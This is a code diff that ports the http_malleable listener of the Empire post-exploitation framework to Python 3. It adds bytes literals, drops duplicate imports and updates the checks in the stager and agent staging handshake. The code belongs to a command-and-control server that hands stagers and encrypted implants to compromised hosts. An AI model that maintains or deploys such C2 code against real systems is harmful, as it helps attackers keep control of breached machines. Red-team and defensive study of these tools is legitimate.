@@ -30,19 +30,10 @@ from lib.common import templating
 from lib.common import obfuscation
 from lib.common import bypasses
 
-# Empire imports
-from lib.common import helpers
-from lib.common import agents
-from lib.common import encryption
-from lib.common import packets
-from lib.common import messages
-from lib.common import templating
-from lib.common import obfuscation
-
 # Malleable imports
 from lib.common import malleable
 
-class Listener:
+class Listener(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -150,7 +141,6 @@ class Listener:
 
         # set the default staging key to the controller db default
         self.options['StagingKey']['Value'] = str(helpers.get_config('staging_key')[0])
-
 
     def default_response(self):
         """
@@ -1114,7 +1104,7 @@ class Listener:
                         if dataResults and len(dataResults) > 0:
                             for (language, results) in dataResults:
                                 if results:
-                                    if results == 'STAGE0':
+                                    if results == b'STAGE0':
                                         # step 2 of negotiation -> server returns stager (stage 1)
 
                                         # log event
@@ -1132,12 +1122,12 @@ class Listener:
                                         malleableResponse = implementation.construct_server(stager)
                                         return Response(malleableResponse.body, malleableResponse.code, malleableResponse.headers)
 
-                                    elif results.startswith('STAGE2'):
+                                    elif results.startswith(b'STAGE2'):
                                         # step 6 of negotiation -> server sends patched agent (stage 2)
 
                                         if ':' in clientIP:
                                             clientIP = '[' + str(clientIP) + ']'
-                                        sessionID = results.split(' ')[1].strip()
+                                        sessionID = results.split(b' ')[1].strip().decode('UTF-8')
                                         sessionKey = self.mainMenu.agents.agents[sessionID]['sessionKey']
 
                                         # log event
@@ -1168,7 +1158,7 @@ class Listener:
                                         # note: stage1 comms are hard coded, can't use malleable here.
                                         return Response(encryptedAgent, 200, implementation.server.headers)
 
-                                    elif results[:10].lower().startswith('error') or results[:10].lower().startswith('exception'):
+                                    elif results[:10].lower().startswith(b'error') or results[:10].lower().startswith(b'exception'):
                                         # agent returned an error
                                         message = "[!] Error returned for results by {} : {}".format(clientIP, results)
                                         signal = json.dumps({
@@ -1179,7 +1169,7 @@ class Listener:
 
                                         return Response(self.default_response(), 404)
 
-                                    elif results.startswith('ERROR:'):
+                                    elif results.startswith(b'ERROR:'):
                                         # error parsing agent data
                                         message = "[!] Error from agents.handle_agent_data() for {} from {}: {}".format(request_uri, clientIP, results)
                                         signal = json.dumps({
@@ -1188,14 +1178,14 @@ class Listener:
                                         })
                                         dispatcher.send(signal, sender="listeners/http_malleable/{}".format(listenerName))
 
-                                        if 'not in cache' in results:
+                                        if b'not in cache' in results:
                                             # signal the client to restage
                                             print(helpers.color("[*] Orphaned agent from %s, signaling restaging" % (clientIP)))
                                             return make_response("", 401)
 
                                         return Response(self.default_response(), 404)
 
-                                    elif results == 'VALID':
+                                    elif results == b'VALID':
                                         # agent posted results
                                         message = "[*] Valid results returned by {}".format(clientIP)
                                         signal = json.dumps({
@@ -1208,7 +1198,7 @@ class Listener:
                                         return Response(malleableResponse.body, malleableResponse.code, malleableResponse.headers)
 
                                     else:
-                                        if request.method == "POST":
+                                        if request.method == b"POST":
                                             # step 4 of negotiation -> server returns RSA(nonce+AESsession))
 
                                             # log event
